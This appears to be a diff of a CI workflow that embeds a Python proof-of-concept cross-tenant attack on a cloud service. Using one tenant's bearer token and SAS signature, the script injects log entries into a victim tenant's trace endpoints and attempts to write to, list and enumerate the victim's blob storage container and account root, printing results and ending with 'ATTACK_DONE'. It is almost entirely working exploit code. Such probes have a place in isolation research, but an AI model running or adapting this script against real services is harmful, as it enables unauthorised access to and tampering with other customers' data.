@@ -27,57 +27,57 @@ jobs:
           a_trace= s.get('traceApiUrl', '')
           a_sas  = s.get('diagnosticsSasUri', '')
 
-          valloc = os.environ['V_ALLOC']
-          vtrace = os.environ['V_TRACE']
-          vwtrace= os.environ.get('V_WTRACE', '')
-          vsas   = os.environ['V_SAS']
+          valloc = os.environ['V_ALLOC']; vtrace = os.environ['V_TRACE']
+          vwtrace= os.environ.get('V_WTRACE', ''); vsas = os.environ['V_SAS']
 
-          def b64d(x):
-              x += '=' * (-len(x) % 4); return base64.urlsafe_b64decode(x)
-          a_wid = json.loads(b64d(tok.split('.')[1])).get('wid', '')
-          print('ATTACKER_OWN_WID=' + a_wid)
+          print('ATTACKER_A_SAS=' + a_sas)
           print('TARGET_VICTIM_ALLOC=' + valloc)
 
-          def post(url, body):
+          def http(method, url, data=None, headers=None):
               try:
-                  r = urllib.request.Request(url, data=json.dumps(body).encode(), method='POST')
-                  r.add_header('Authorization', 'Bearer ' + tok)
-                  r.add_header('Content-Type', 'application/json')
+                  r = urllib.request.Request(url, data=data, method=method)
+                  for k, v in (headers or {}).items(): r.add_header(k, v)
                   resp = urllib.request.urlopen(r, timeout=20)
-                  return resp.status, resp.read(400).decode('utf-8', 'replace')
-              except urllib.error.HTTPError as e:
-                  return e.code, e.read(400).decode('utf-8', 'replace')
-              except Exception as e:
-                  return 'ERR', str(e)
-
-          entry = [{'level': 0, 'message': CANARY + ' injected-by-foreign-tenant', 'allocationId': valloc}]
-          for tag, url in [('A_own_trace', a_trace), ('B_trace', vtrace), ('B_wtrace', vwtrace)]:
-              if not url: continue
-              st, b = post(url, entry)
-              print('INJECT[%s] %s -> %s %s' % (tag, url, st, b[:120].replace(chr(10), ' ')))
-
-          # SAS cross-access: apply attacker's SAS signature to the VICTIM's container
-          def cross_list(my_sas, victim_sas):
-              try:
-                  _, q = my_sas.split('?', 1)
-                  base, _ = victim_sas.split('?', 1)
-                  m = re.match(r'(https://[^/]+/[^/?]+)', base)
-                  cont = m.group(1)
-                  url = cont + '?restype=container&comp=list&' + q
-                  r = urllib.request.urlopen(url, timeout=20)
-                  return r.status, r.read(1200).decode('utf-8', 'replace')
+                  return resp.status, resp.read(800).decode('utf-8', 'replace')
               except urllib.error.HTTPError as e:
                   return e.code, e.read(600).decode('utf-8', 'replace')
               except Exception as e:
                   return 'ERR', str(e)
 
-          st, b = cross_list(a_sas, vsas)
-          print('SAS_CROSS_LIST[Asig_on_Bcontainer] -> %s | %s' % (st, b[:400].replace(chr(10), ' ')))
+          # ---- trace injection: foreign tenant's token, victim's allocId, victim's region ----
+          entry = json.dumps([{'level': 0, 'message': CANARY + ' foreign-injected', 'allocationId': valloc}]).encode()
+          hdr = {'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}
+          for tag, url in [('A_own_trace', a_trace), ('B_trace', vtrace), ('B_wtrace', vwtrace)]:
+              if not url: continue
+              st, b = http('POST', url, entry, hdr)
+              print('INJECT[%s] -> %s %s' % (tag, st, b[:100].replace(chr(10), ' ')))
 
-          ah = a_sas.split('/')[2] if '//' in a_sas else ''
-          bh = vsas.split('/')[2] if '//' in vsas else ''
-          print('A_BLOB_HOST=' + ah)
-          print('B_BLOB_HOST=' + bh)
-          print('SAME_STORAGE_ACCOUNT=' + str(ah == bh and ah != ''))
+          def container_of(sasuri):
+              base, q = sasuri.split('?', 1)
+              m = re.match(r'(https://[^/]+/[^/?]+)', base)
+              return m.group(1), q   # (https://acct/container , sasquery)
+
+          a_cont, a_q = container_of(a_sas)
+          b_cont, b_q = container_of(vsas)
+          a_host = a_sas.split('/')[2]; b_host = vsas.split('/')[2]
+          print('A_BLOB_HOST=' + a_host); print('B_BLOB_HOST=' + b_host)
+          print('SAME_STORAGE_ACCOUNT=' + str(a_host == b_host and a_host != ''))
+
+          # ---- sanity: write to OWN container with OWN sig (proves SAS works) ----
+          st, b = http('PUT', a_cont + '/selftest-' + CANARY + '?' + a_q, b'own-write-test', {'x-ms-blob-type': 'BlockBlob'})
+          print('OWN_WRITE[Asig_on_Acont] -> %s %s' % (st, b[:120].replace(chr(10), ' ')))
+
+          # ---- cross-tenant WRITE: A's sig on B's container ----
+          st, b = http('PUT', b_cont + '/xtenant-' + CANARY + '?' + a_q, b'foreign-write-test', {'x-ms-blob-type': 'BlockBlob'})
+          print('CROSS_WRITE[Asig_on_Bcont] -> %s %s' % (st, b[:200].replace(chr(10), ' ')))
+
+          # ---- cross-tenant LIST: A's sig on B's container ----
+          st, b = http('GET', b_cont + '?restype=container&comp=list&' + a_q)
+          print('CROSS_LIST[Asig_on_Bcont] -> %s %s' % (st, b[:200].replace(chr(10), ' ')))
+
+          # ---- account-root container enumeration with A's sig ----
+          st, b = http('GET', 'https://' + a_host + '/?comp=list&' + a_q)
+          print('ACCT_LIST[Asig_on_account_root] -> %s %s' % (st, b[:300].replace(chr(10), ' ')))
+
           print('ATTACK_DONE')
           PYEOF
